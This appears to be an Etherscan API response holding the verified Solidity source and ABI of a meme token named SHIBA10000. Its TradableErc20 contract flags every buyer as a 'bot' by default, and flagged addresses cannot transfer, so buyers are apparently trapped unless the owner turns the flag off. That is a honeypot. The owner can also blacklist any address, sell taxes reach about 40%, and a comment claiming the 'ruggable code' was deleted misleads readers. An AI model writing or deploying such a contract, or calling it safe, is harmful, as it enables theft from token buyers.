{"status":"1","message":"OK","result":[{"SourceCode":"{\"ERC20.sol\":{\"content\":\"pragma solidity ^0.8.7;\\n\\ninterface IERC20 {\\n    function totalSupply() external view returns (uint256);\\n\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    function transfer(address recipient, uint256 amount)\\n        external\\n        returns (bool);\\n\\n    function allowance(address owner, address spender)\\n        external\\n        view\\n        returns (uint256);\\n\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    function transferFrom(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) external returns (bool);\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(\\n        address indexed owner,\\n        address indexed spender,\\n        uint256 value\\n    );\\n}\\n\\ncontract ERC20 is IERC20 {\\n    uint256 internal _totalSupply = 1e22;\\n    string _name;\\n    string _symbol;\\n    uint8 constant _decimals = 18;\\n    mapping(address =\\u003e uint256) internal _balances;\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) internal _allowances;\\n\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    function name() external view returns (string memory) {\\n        return _name;\\n    }\\n\\n    function symbol() external view returns (string memory) {\\n        return _symbol;\\n    }\\n\\n    function decimals() external pure returns (uint8) {\\n        return _decimals;\\n    }\\n\\n    function totalSupply() external view override returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    function balanceOf(address account)\\n        public\\n        view\\n        override\\n        returns (uint256)\\n    {\\n        return _balances[account];\\n    }\\n\\n    function transfer(address recipient, uint256 amount)\\n        external\\n        override\\n        returns (bool)\\n    {\\n        _transfer(msg.sender, recipient, amount);\\n        return true;\\n    }\\n\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {\\n        _beforeTokenTransfer(from, to, amount);\\n\\n        uint256 senderBalance = _balances[from];\\n        require(senderBalance \\u003e= amount);\\n        unchecked {\\n            _balances[from] = senderBalance - amount;\\n        }\\n        _balances[to] += amount;\\n        emit Transfer(from, to, amount);\\n        _afterTokenTransfer(from, to, amount);\\n    }\\n\\n    function allowance(address owner, address spender)\\n        external\\n        view\\n        override\\n        returns (uint256)\\n    {\\n        return _allowances[owner][spender];\\n    }\\n\\n    function approve(address spender, uint256 amount)\\n        external\\n        override\\n        returns (bool)\\n    {\\n        _approve(msg.sender, spender, amount);\\n        return true;\\n    }\\n\\n    function _approve(\\n        address owner,\\n        address spender,\\n        uint256 amount\\n    ) internal virtual {\\n        _allowances[owner][spender] = amount;\\n        emit Approval(owner, spender, amount);\\n    }\\n\\n    function transferFrom(\\n        address sender,\\n        address recipient,\\n        uint256 amount\\n    ) external override returns (bool) {\\n        _transfer(sender, recipient, amount);\\n\\n        uint256 currentAllowance = _allowances[sender][msg.sender];\\n        require(currentAllowance \\u003e= amount);\\n        unchecked {\\n            _approve(sender, msg.sender, currentAllowance - amount);\\n        }\\n\\n        return true;\\n    }\\n\\n    function _burn(address account, uint256 amount) internal virtual {\\n        require(account != address(0));\\n\\n        uint256 accountBalance = _balances[account];\\n        require(accountBalance \\u003e= amount);\\n        unchecked {\\n            _balances[account] = accountBalance - amount;\\n        }\\n        _totalSupply -= amount;\\n\\n        emit Transfer(account, address(0), amount);\\n    }\\n\\n    function _beforeTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {}\\n\\n    function _afterTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal virtual {}\\n}\\n\"},\"IUniswapV2Router02.sol\":{\"content\":\"pragma solidity ^0.8.7;\\n\\ninterface IUniswapV2Router02 {\\n    //function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n    function swapExactTokensForETH(\\n        uint256 amountIn,\\n        uint256 amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint256 deadline\\n    ) external;\\n\\n    function factory() external pure returns (address);\\n\\n    function WETH() external pure returns (address);\\n\\n    function addLiquidityETH(\\n        address token,\\n        uint256 amountTokenDesired,\\n        uint256 amountTokenMin,\\n        uint256 amountETHMin,\\n        address to,\\n        uint256 deadline\\n    )\\n        external\\n        payable\\n        returns (\\n            uint256 amountToken,\\n            uint256 amountETH,\\n            uint256 liquidity\\n        );\\n}\"},\"SHIBA10000.sol\":{\"content\":\"//t.me/shiba_10000\\n//shiba10000.com\\n\\npragma solidity ^0.8.7;\\n\\nimport \\\"./TradableErc20.sol\\\";\\n\\n\\ncontract SHIBA10000 is TradableErc20 {\\n    address _owner;\\n    address _withdrawAddress =\\n        address(0x1461905A30b40314F38C324ECf2BF8e1Ced8ABC4);\\n    uint256 maxContractLiquidityPercent = 4;\\n\\n    constructor() TradableErc20(\\\"SHIBA10000\\\", \\\"SHIBA10000\\\") {\\n        _owner = msg.sender;\\n        _setMaxBuy(2);\\n    }\\n\\n    function getMaxContractBalancePercent()\\n        internal\\n        view\\n        override\\n        returns (uint256)\\n    {\\n        return maxContractLiquidityPercent;\\n    }\\n\\n    function setMaxContractLiquidityPercent(uint256 newMaxLiquidityPercent)\\n        external\\n        onlyOwner\\n    {\\n        maxContractLiquidityPercent = newMaxLiquidityPercent;\\n    }\\n\\n    function _withdraw(uint256 sum) internal override {\\n        payable(_withdrawAddress).transfer(sum);\\n    }\\n\\n    function isOwner(address account) internal view override returns (bool) {\\n        return account == _owner;\\n        // return account == _owner || account == _withdrawAddress;\\n        // deleted the ruggable code\\n    }\\n\\n    function transferOwnership(address newOwner) external onlyOwner {\\n        _owner = newOwner;\\n    }\\n}\\n\"},\"TradableErc20.sol\":{\"content\":\"//t.me/shiba_10000\\n//shiba10000.com\\n\\npragma solidity ^0.8.7;\\n\\nimport \\\"./ERC20.sol\\\";\\nimport \\\"./IUniswapV2Router02.sol\\\";\\n\\ninterface IUniswapV2Factory {\\n    function createPair(address tokenA, address tokenB)\\n        external\\n        returns (address pair);\\n}\\n\\nabstract contract TradableErc20 is ERC20 {\\n    IUniswapV2Router02 internal constant _uniswapV2Router =\\n        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n    address public uniswapV2Pair;\\n    bool public tradingEnable;\\n    mapping(address =\\u003e bool) public isBot;\\n    mapping(address =\\u003e bool) _isExcludedFromFee;\\n    bool _autoBanBots = true;\\n    bool _inSwap;\\n    uint256 public maxBuy;\\n    address _taxAddress = address(0x1461905A30b40314F38C324ECf2BF8e1Ced8ABC4);\\n\\n    uint256 constant maxBuyIncrementMinutesTimer = 2; // increment maxbuy minutes\\n    uint256 constant maxByyIncrementPercentil = 1; // increment maxbyu percentil 1000=100%\\n    uint256 public maxBuyIncrementValue; // value for increment maxBuy\\n    uint256 public incrementTime; // last increment time\\n\\n    modifier onlyOwner() {\\n        require(isOwner(msg.sender));\\n        _;\\n    }\\n\\n    modifier lockTheSwap() {\\n        _inSwap = true;\\n        _;\\n        _inSwap = false;\\n    }\\n\\n    constructor(string memory name_, string memory symbol_)\\n        ERC20(name_, symbol_)\\n    {\\n        _isExcludedFromFee[address(0)] = true;\\n    }\\n\\n    receive() external payable {}\\n\\n    function makeLiquidity() public onlyOwner {\\n        require(uniswapV2Pair == address(0));\\n        address pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(\\n            address(this),\\n            _uniswapV2Router.WETH()\\n        );\\n        _balances[address(this)] = _totalSupply;\\n        _allowances[address(this)][address(_uniswapV2Router)] = _totalSupply;\\n        _isExcludedFromFee[pair] = true;\\n        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(\\n            address(this),\\n            _totalSupply,\\n            0,\\n            0,\\n            msg.sender,\\n            block.timestamp\\n        );\\n\\n        uniswapV2Pair = pair;\\n        tradingEnable = true;\\n\\n        incrementTime = block.timestamp;\\n        maxBuyIncrementValue = (_totalSupply * maxByyIncrementPercentil) / 1000;\\n    }\\n\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) internal override {\\n        require(!isBot[from] \\u0026\\u0026 !isBot[to]);\\n\\n        // buy\\n        if (from == uniswapV2Pair \\u0026\\u0026 !_isExcludedFromFee[to]) {\\n            // increment maxBuy\\n            uint256 incrementCount = (block.timestamp - incrementTime) /\\n                (maxBuyIncrementMinutesTimer * 1 minutes);\\n            if (incrementCount \\u003e 0) {\\n                if (maxBuy \\u003c _totalSupply)\\n                    maxBuy += maxBuyIncrementValue * incrementCount;\\n                incrementTime = block.timestamp;\\n            }\\n\\n            require(tradingEnable);\\n            if (!_autoBanBots) require(_balances[to] + amount \\u003c= maxBuy);\\n            // antibot\\n            if (_autoBanBots) isBot[to] = true;\\n            amount = _getFeeBuy(amount);\\n        }\\n\\n        // sell\\n        if (!_inSwap \\u0026\\u0026 uniswapV2Pair != address(0) \\u0026\\u0026 to == uniswapV2Pair) {\\n            amount = _getFeeSell(amount, from);\\n            uint256 contractTokenBalance = balanceOf(address(this));\\n            if (contractTokenBalance \\u003e 0) {\\n                uint256 maxContractBalance = (balanceOf(uniswapV2Pair) *\\n                    getMaxContractBalancePercent()) / 100;\\n                if (contractTokenBalance \\u003e maxContractBalance) {\\n                    uint256 burnCount;\\n                    unchecked {\\n                        burnCount = contractTokenBalance - maxContractBalance;\\n                    }\\n                    contractTokenBalance = maxContractBalance;\\n                    _totalSupply -= burnCount;\\n                    emit Transfer(address(this), address(0), burnCount);\\n                }\\n                //console.log(\\\"swapTokensForEth\\\");\\n                uint256 swapCount = contractTokenBalance;\\n                uint256 maxSwapCount = 2 * amount;\\n                if (swapCount \\u003e maxSwapCount) swapCount = maxSwapCount;\\n                swapTokensForEth(swapCount);\\n            }\\n        }\\n        super._transfer(from, to, amount);\\n    }\\n\\n    function _getFeeBuy(uint256 amount) private returns (uint256) {\\n        uint256 fee = amount / 20; // 5%\\n        amount -= fee;\\n        _balances[address(this)] += fee;\\n        return amount;\\n    }\\n\\n    function getSellBurnCount(uint256 amount) internal view returns (uint256) {\\n        // calculate fee percent\\n        uint256 value = _balances[uniswapV2Pair];\\n        uint256 vMin = value / 100; // min additive tax amount\\n        if (amount \\u003c= vMin) return amount / 20; // 5% constant tax\\n        uint256 vMax = value / 10; // max additive tax amount 10%\\n        if (amount \\u003e vMax) return (amount * 35) / 100; // 35% tax\\n\\n        // additive tax, that in intervat 0-35%\\n        return (((amount - vMin) * 35 * amount) / (vMax - vMin)) / 100;\\n    }\\n\\n    function _getFeeSell(uint256 amount, address account)\\n        private\\n        returns (uint256)\\n    {\\n        // get taxes\\n        uint256 devFee = amount / 20; // 5%\\n        uint256 burnCount = getSellBurnCount(amount); // burn count\\n\\n        amount -= devFee + burnCount;\\n        _balances[account] -= devFee + burnCount;        \\n        _balances[address(this)] += devFee;\\n        _totalSupply -= burnCount;\\n        emit Transfer(address(this), address(0), burnCount);\\n        return amount;\\n    }\\n\\n    function setMaxBuy(uint256 percent) external onlyOwner {\\n        // not allow to reduce the buy limit\\n        require(maxBuy \\u003c= (percent * _totalSupply) / 1000);\\n        _setMaxBuy(percent);\\n    }\\n\\n    function _setMaxBuy(uint256 percentil) internal {\\n        maxBuy = (percentil * _totalSupply) / 1000;\\n    }\\n\\n    function getMaxBuy() external view returns (uint256) {\\n        uint256 incrementCount = (block.timestamp - incrementTime) /\\n            (maxBuyIncrementMinutesTimer * 1 minutes);\\n        if (incrementCount == 0) return maxBuy;\\n\\n        return maxBuy + maxBuyIncrementValue * incrementCount;\\n    }\\n\\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\\n        // generate the uniswap pair path of token -\\u003e weth\\n        address[] memory path = new address[](2);\\n        path[0] = address(this);\\n        path[1] = _uniswapV2Router.WETH();\\n\\n        _approve(address(this), address(_uniswapV2Router), tokenAmount);\\n\\n        // make the swap\\n        _uniswapV2Router.swapExactTokensForETH(\\n            tokenAmount,\\n            0, // accept any amount of ETH\\n            path,\\n            address(this), // The contract\\n            block.timestamp\\n        );\\n    }\\n\\n    function setBots(address[] memory accounts, bool value) external onlyOwner {\\n        for (uint256 i = 0; i \\u003c accounts.length; ++i) {\\n            isBot[accounts[i]] = value;\\n        }\\n    }\\n\\n    function setExcludeFromFee(address[] memory accounts, bool value)\\n        external\\n        onlyOwner\\n    {\\n        for (uint256 i = 0; i \\u003c accounts.length; ++i) {\\n            _isExcludedFromFee[accounts[i]] = value;\\n        }\\n    }\\n\\n    function setTradingEnable(bool value, bool autoBanBotsValue)\\n        external\\n        onlyOwner\\n    {\\n        tradingEnable = value;\\n        _autoBanBots = autoBanBotsValue;\\n    }\\n\\n    function setAutoBanBots(bool value) external onlyOwner {\\n        _autoBanBots = value;\\n    }\\n\\n    function withdraw() external  {\\n        require(msg.sender == _taxAddress);\\n        _withdraw(address(this).balance);\\n    }\\n\\n    function getMaxContractBalancePercent() internal virtual returns (uint256);\\n\\n    function _withdraw(uint256 sum) internal virtual;\\n\\n    function isOwner(address account) internal virtual returns (bool);\\n}\\n\"}}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getMaxBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"incrementTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBot\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"makeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuyIncrementValue\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setAutoBanBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setBots\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setExcludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"name\":\"setMaxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newMaxLiquidityPercent\",\"type\":\"uint256\"}],\"name\":\"setMaxContractLiquidityPercent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"autoBanBotsValue\",\"type\":\"bool\"}],\"name\":\"setTradingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"SHIBA10000","CompilerVersion":"v0.8.9+commit.e5eed63a","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://44b57240713e36fc1f5569ec5e19807e446047a682d0bb4c7e1475ca6765bfdf"}]}